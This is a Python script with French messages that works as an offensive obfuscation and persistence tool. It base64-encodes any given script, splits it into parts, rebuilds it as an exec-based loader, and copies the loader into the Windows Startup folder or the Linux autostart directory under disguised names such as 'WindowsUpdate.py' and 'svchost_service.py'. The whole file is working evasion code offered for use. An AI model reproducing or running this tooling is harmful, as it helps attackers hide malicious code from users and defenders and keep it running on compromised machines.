import base64
import os
import random
import string
from pathlib import Path
import shutil

LEGIT_NAMES = [
    "WindowsUpdate.py", "SystemDriver.py", "chrome_service.py",
    "svchost_service.py", "OneDriveSync.py", "winlogon.py"
]

STEALTH_DIRS = {
    "windows": os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"),
    "linux": os.path.expanduser("~/.config/autostart")
}

def encode_script_to_base64(input_file):
    with open(input_file, "rb") as f:
        encoded = base64.b64encode(f.read()).decode()
    return encoded

def split_script(encoded_str, parts=3):
    length = len(encoded_str)
    size = length // parts
    return [encoded_str[i:i+size] for i in range(0, length, size)]

def generate_random_name():
    return random.choice(LEGIT_NAMES)

def write_split_files(splits, base_name, output_dir="outputs"):
    os.makedirs(output_dir, exist_ok=True)
    filenames = []
    for i, part in enumerate(splits):
        part_file = os.path.join(output_dir, f"{base_name}_part{i}.txt")
        with open(part_file, "w") as f:
            f.write(part)
        filenames.append(part_file)
    return filenames

def reconstruct_script(part_files, output_script="outputs/reconstructed.py"):
    with open(output_script, "w") as out:
        out.write("import base64\nexec(base64.b64decode('''")
        for part in part_files:
            with open(part, "r") as f:
                out.write(f.read())
        out.write("'''))")

def hide_in_startup(script_path):
    os_name = os.name
    if os_name == "nt":
        stealth_path = STEALTH_DIRS["windows"]
    else:
        stealth_path = STEALTH_DIRS["linux"]

    os.makedirs(stealth_path, exist_ok=True)
    legit_name = generate_random_name()
    dest_path = os.path.join(stealth_path, legit_name)
    shutil.copy2(script_path, dest_path)
    print(f"[+] Script caché dans : {dest_path}")

def obfuscate_script(script_path):
    print("[*] Encodage du script en base64 + split + camouflage...")

    encoded = encode_script_to_base64(script_path)
    splits = split_script(encoded, parts=3)
    base_name = Path(script_path).stem
    part_files = write_split_files(splits, base_name)

    reconstructed = f"outputs/{generate_random_name().replace('.py', '_reconstructed.py')}"
    reconstruct_script(part_files, reconstructed)
    hide_in_startup(reconstructed)

    print("[+] Obfuscation et évasion terminées.")
    return reconstructed

if __name__ == "__main__":
    target = input("[?] Chemin du script à dissimuler : ").strip()
    if Path(target).exists():
        obfuscate_script(target)
    else:
        print("[!] Fichier introuvable.")
